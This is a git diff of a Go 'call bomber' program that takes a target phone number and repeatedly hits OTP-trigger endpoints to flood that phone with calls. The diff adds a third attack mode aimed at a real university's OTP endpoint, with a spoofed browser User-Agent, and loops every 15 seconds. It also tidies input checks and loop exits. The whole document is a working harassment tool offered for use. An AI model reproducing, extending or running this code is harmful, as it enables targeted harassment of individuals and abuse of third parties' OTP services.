@@ -53,12 +53,15 @@ func main() {
 	if _, err = fmt.Scan(&times); err != nil {
 		pauses(err.Error(), 1)
 	}
+	if times <= 0 {
+		pauses("Please enter a valid number of times!", 1)
+	}
 	var typeofc int
-	fmt.Print("Enter the type of call you would like to BOMB; Enter 1 or 2, 1 is using post and 2 is using get method:\n")
+	fmt.Print("Enter the type of call you would like to BOMB, Enter 1, 2 or 3; 1 and 3 is using POST and 2 is using GET method, rest all diffrent:\n")
 	if _, err = fmt.Scan(&typeofc); err != nil {
 		pauses(err.Error(), 1)
 	}
-	log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", times*15)
+	log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", (times-1)*15)
 	if typeofc == 1 {
 		for i := 0; i < times; i++ {
 			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
@@ -73,6 +76,9 @@ func main() {
 				pauses(err.Error(), 1)
 			}
 			_ = resp.Body.Close()
+			if i+1 == times {
+				break
+			}
 			time.Sleep(15 * time.Second)
 		}
 	} else if typeofc == 2 {
@@ -81,11 +87,33 @@ func main() {
 			if err != nil {
 				pauses(err.Error(), 1)
 			}
+			log.Println(i)
 			_ = resp.Body.Close()
+			if i+1 == times {
+				break
+			}
+			time.Sleep(15 * time.Second)
+		}
+	} else if typeofc == 3 {
+		for i := 0; i < times; i++ {
+			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
+			req, _ := http.NewRequest("POST", "https://emasters.iitk.ac.in/extras/trigger-otp", bytes.NewBuffer(postData))
+			req.Header.Set("Host", "emasters.iitk.ac.in")
+			req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0")
+			req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+			client := &http.Client{}
+			resp, err := client.Do(req)
+			if err != nil {
+				pauses(err.Error(), 1)
+			}
+			_ = resp.Body.Close()
+			if i+1 == times {
+				break
+			}
 			time.Sleep(15 * time.Second)
 		}
 	} else {
-		pauses("Please enter 1 or 2 in type!", 1)
+		pauses("Please enter 1, 2 or 3 in type!", 1)
 	}
 	pauses("Success!\nBye!", 0)
 }
